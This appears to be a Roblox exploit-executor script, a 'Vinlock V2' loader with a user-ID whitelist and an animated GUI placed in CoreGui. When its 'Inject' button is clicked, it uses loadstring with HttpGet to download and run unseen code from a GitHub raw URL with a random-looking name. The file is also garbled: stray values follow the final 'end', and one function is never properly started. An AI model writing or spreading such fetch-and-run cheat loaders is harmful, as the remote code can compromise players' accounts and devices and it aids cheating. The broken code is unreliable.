local player = {
    "1309599010",
    "55079773",
    "1384515218",
    "287370936"
}

userid1 = game.Players.LocalPlayer.UserId
userid2 = tostring(userid1)
coolio = true
for i,v in pairs(player) do
    if v == userid2 then 
        while coolio == true do
            coolio = false
            local ScreenGui = Instance.new("ScreenGui")
            local Main = Instance.new("Frame")
            local Open = Instance.new("Frame")
            local UICorner = Instance.new("UICorner")
            local mainopen = Instance.new("Frame")
            local one = Instance.new("Frame")
            local UICorner_2 = Instance.new("UICorner")
            local two = Instance.new("Frame")
            local UICorner_3 = Instance.new("UICorner")
            local three = Instance.new("Frame")
            local UICorner_4 = Instance.new("UICorner")
            local four = Instance.new("Frame")
            local UICorner_5 = Instance.new("UICorner")
            local welcome = Instance.new("Frame")
            local welcomename = Instance.new("TextLabel")
            local UICorner_6 = Instance.new("UICorner")
            local Block = Instance.new("Frame")
            local UICorner_7 = Instance.new("UICorner")
            local buttonopen = Instance.new("Frame")
            local TextButton = Instance.new("TextButton")
            local UICorner_8 = Instance.new("UICorner")
            local v2 = Instance.new("TextLabel")

            --Properties:

            ScreenGui.Parent = game.CoreGui
            ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

            Main.Name = "Main"
            Main.Parent = ScreenGui
            Main.Active = true
            Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Main.BackgroundTransparency = 1.000
            Main.Size = UDim2.new(0, 100, 0, 100)

            Open.Name = "Open"
            Open.Parent = Main
            Open.Active = true
            Open.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
            Open.ClipsDescendants = true
            Open.Position = UDim2.new(7.51000023, 0, 2.82399988, 0)
            Open.Selectable = true
            Open.Size = UDim2.new(0, 255, 0, 130)

            UICorner.Parent = Open

            mainopen.Name = "mainopen"
            mainopen.Parent = Open
            mainopen.Active = true
            mainopen.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            mainopen.BackgroundTransparency = 1.000
            mainopen.Size = UDim2.new(0, 455, 0, 285)
            mainopen.Visible = false

            one.Name = "one"
            one.Parent = mainopen
            one.Active = true
            one.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
            one.Position = UDim2.new(-0.0219780225, 0, 0, 0)
            one.Size = UDim2.new(0, 10, 0, 66)

            UICorner_2.Parent = one

            two.Name = "two"
            two.Parent = mainopen
            two.Active = true
            two.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
            two.Position = UDim2.new(-0.0219780225, 0, 0.236051515, 0)
            two.Size = UDim2.new(0, 10, 0, 66)

            UICorner_3.Parent = two

            three.Name = "three"
            three.Parent = mainopen
            three.Active = true
            three.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
            three.Position = UDim2.new(-0.0219780225, 0, 0.463519335, 0)
            three.Size = UDim2.new(0, 10, 0, 66)

            UICorner_4.Parent = three

            four.Name = "four"
            four.Parent = mainopen
            four.Active = true
            four.BackgroundColor3 = Color3.fromRGB(9, 9, 9)
            four.Position = UDim2.new(-0.0219780225, 0, 0.686695278, 0)
            four.Size = UDim2.new(0, 10, 0, 73)

            UICorner_5.Parent = four

            welcome.Name = "welcome"
            welcome.Parent = mainopen
            welcome.Active = true
            welcome.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            welcome.BackgroundTransparency = 1.000
            welcome.ClipsDescendants = true
            welcome.Position = UDim2.new(0.112087913, 0, 0.142857149, 0)
            welcome.Size = UDim2.new(0, 354, 0, 186)

            welcomename.Name = "welcomename"
            welcomename.Parent = welcome
            welcomename.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
            welcomename.BackgroundTransparency = 0.050
            welcomename.Position = UDim2.new(-1.03954804, 0, 0.300981432, 0)
            welcomename.Size = UDim2.new(0, 354, 0, 74)
            welcomename.Font = Enum.Font.SourceSansBold
            welcomename.Text = "Welcome, name"
            welcomename.TextColor3 = Color3.fromRGB(220, 220, 220)
            welcomename.TextSize = 50.000

            UICorner_6.Parent = welcomename

            Block.Name = "Block"
            Block.Parent = Open
            Block.Active = true
            Block.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Block.Position = UDim2.new(0, 0, 0.94615382, 0)
            Block.Size = UDim2.new(0, 255, 0, 7)

            UICorner_7.CornerRadius = UDim.new(0, 3)
            UICorner_7.Parent = Block

            buttonopen.Name = "buttonopen"
            buttonopen.Parent = Open
            buttonopen.Active = true
            buttonopen.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
            buttonopen.Position = UDim2.new(0.0274509806, 0, 0.0461538471, 0)
            buttonopen.Size = UDim2.new(0, 241, 0, 117)

            TextButton.Parent = buttonopen
            TextButton.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
            TextButton.Position = UDim2.new(0.0497925319, 0, 0.0921343938, 0)
            TextButton.Size = UDim2.new(0, 217, 0, 95)
            TextButton.Font = Enum.Font.SourceSansBold
            TextButton.Text = "Inject"
            TextButton.TextColor3 = Color3.fromRGB(223, 223, 223)
            TextButton.TextSize = 45.000

            UICorner_8.CornerRadius = UDim.new(0, 10)
            UICorner_8.Parent = TextButton

            v2.Name = "v2"
            v2.Parent = buttonopen
            v2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            v2.BackgroundTransparency = 1.000
            v2.Position = UDim2.new(0.0829875544, 0, 0.572649598, 0)
            v2.Size = UDim2.new(0, 200, 0, 50)
            v2.Font = Enum.Font.SourceSansBold
            v2.Text = "Vinlock V2"
            v2.TextColor3 = Color3.fromRGB(223, 223, 223)
            v2.TextSize = 12.000

            -- Scripts:

            -- Main.Visibility is disabled.
            -- Main.color is disabled.
            local function ZFCIJ_fake_script() -- Open.orphans are yummy 
                local script = Instance.new('LocalScript', Open)

                local button1 = script.Parent.buttonopen.TextButton
                local frame = script.Parent.Parent.Open
                local frame1 = script.Parent.mainopen.one
                local frame2 = script.Parent.mainopen.two
                local frame3 = script.Parent.mainopen.three
                local frame4 = script.Parent.mainopen.four
                local welcometxt = script.Parent.mainopen.welcome.welcomename
                local plr = workspace.Parent.Players.LocalPlayer.DisplayName
                script.Parent.mainopen.welcome.welcomename.Text = "Welcome, ".. tostring(plr)
                button1.MouseButton1Click:Connect(function()
                    script.Parent.Block.Visible = false
                    script.Parent.buttonopen.Visible = false
                    frame:TweenSize(UDim2.new(0, 456,0, 257,"Out","Quad",0.5))
                    script.Parent.mainopen.Visible = true
                    wait(1)
                    frame1:TweenSize(UDim2.new(0, 466,0, 66,"Out","Quad",0.7))
                    wait(0.1)
                    frame2:TweenSize(UDim2.new(0, 466,0, 66,"Out","Quad",0.7))
                    wait(0.1)
                    frame3:TweenSize(UDim2.new(0, 466,0, 66,"Out","Quad",0.7))
                    wait(0.1)
                    frame4:TweenSize(UDim2.new(0, 466,0, 66,"Out","Quad",0.7))
                    wait(0.3)
                    welcometxt:TweenPosition(UDim2.new(-0.003, 0,0.301, 0,"Out","Quad",0.5))
                    wait(2)
                    script.Parent.Parent.Open.Visible = false
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/AG93g49fo/sdhgf9d/main/msuidbifisd.lua"))()
                end)
            end
            coroutine.wrap(ZFCIJ_fake_script)()
            local function DYYLZUT_fake_script() -- Open.mm orphans 
                local script = Instance.new('LocalScript', Open)

                local button1 = script.Parent.buttonopen.TextButton
                local frame = script.Parent.Parent.Open
                button1.MouseButton1Click:Connect(function()
                    script.Parent.Block.Visible = false
                    script.Parent.buttonopen.Visible = false
                    frame:TweenPosition(UDim2.new(6.51, 0,2.194, 0,"Out","Quad",0.5))
                    script.Parent.mainopen.Visible = true
                end)
            end
            coroutine.wrap(DYYLZUT_fake_script)()
            local function NVLWGGU_fake_script() -- Block.LocalScript 
                local script = Instance.new('LocalScript', Block)

                while wait() do
                    script.Parent.Parent.Block.BackgroundColor3 = Color3.new(255/255,0/255,0/255)
                    for i = 0,255,10 do
                        wait()
                        script.Parent.Parent.Block.BackgroundColor3 = Color3.new(255/255,i/255,0/255)
                    end
                    for i = 255,0,-10 do
                        wait()
                        script.Parent.Parent.Block.BackgroundColor3 = Color3.new(i/255,255/255,0/255)
                    end
                    for i = 0,255,10 do
                        wait()
                        script.Parent.Parent.Block.BackgroundColor3 = Color3.new(0/255,255/255,i/255)
                    end
                    for i = 255,0,-10 do
                        wait()
                        script.Parent.Parent.Block.BackgroundColor3 = Color3.new(0/255,i/255,255/255)
                    end
                    for i = 0,255,10 do
                        wait()
                        script.Parent.Parent.Block.BackgroundColor3 = Color3.new(i/255,0/255,255/255)
                    end
                    for i = 255,0,-10 do
                        wait()
                        script.Parent.Parent.Block.BackgroundColor3 = Color3.new(255/255,0/255,i/255)
                    end
                    coroutine.wrap(NVLWGGU_fake_script)()
                end
            end
        end
    end
end,
  "170926359",
  "295325"

